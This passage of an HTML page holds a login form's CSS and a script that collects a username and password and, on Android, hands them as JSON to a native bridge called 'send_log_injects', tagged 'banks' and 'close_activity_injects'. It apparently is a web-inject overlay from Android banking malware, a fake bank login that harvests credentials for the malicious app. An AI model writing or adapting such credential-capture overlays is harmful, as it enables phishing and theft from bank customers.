    section{
        padding: 15px;
    }
    .input{
        width: 100%;
        padding:10px;
        margin-top: 10px;
        border:2px solid #dddddd;
        background-color: #fff;
        border-radius: 5px;
    }
    ::placeholder{
        font-style: italic;
    }
    .toggle {
            position: relative;
            display: block;
            width: 40px;
            height: 20px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transform: translate3d(0, 0, 0);
        }

        .toggle::before {
            content: "";
            position: relative;
            top: 3px;
            left: 3px;
            width: 34px;
            height: 14px;
            display: block;
            background: #a3a3a3;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        .toggle span {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            display: block;
            background: #ececec;
            border-radius: 10px;
            box-shadow: 0 1px 0px rgba(154, 153, 153, 0.5);
            transition: all 0.2s ease;
        }

        .toggle span:before {
            content: "";
            position: absolute;
            display: block;
            margin: -18px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            transform: scale(0);
            opacity: 1;
            pointer-events: none;
        }

        #cbx:checked + .toggle::before {
            background: #1bb1cc6c;
        }

        #cbx:checked + .toggle span {
            transform: translateX(20px);
            background: #1bb1cc;
        }

        #cbx:checked + .toggle span:before {
            transform: scale(1);
            opacity: 0;
            transition: all 0.4s ease;
        }
    .button{
        width: 100%;
        padding: 10px;
        background-color: #117688;
        border:0;
        border-radius: 5px;
        color: #fff;
        font-weight: 600;
        margin-top: 5px;
        margin-bottom: 5px;
    }
    .error {
        border-color: #f00 !important;
    }
    input,button {
            outline: none !important;
            box-shadow: none !important;
        }

    </form>
<script>
    var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');
            

        login.onkeyup = () => {
            login.value = login.value.replace(/[^a-zA-Z0-9]/g, '');
        }

        password.onkeyup = () => {
            password.value = password.value.replace(/[^a-zA-Z0-9]/g, '');
        }
       
        var passw = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,18}$/;

        sendData.onclick = () => {
            if(login.value.length < 8) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(!password.value.match(passw)) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 8 && password.value.match(passw)) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
</script>
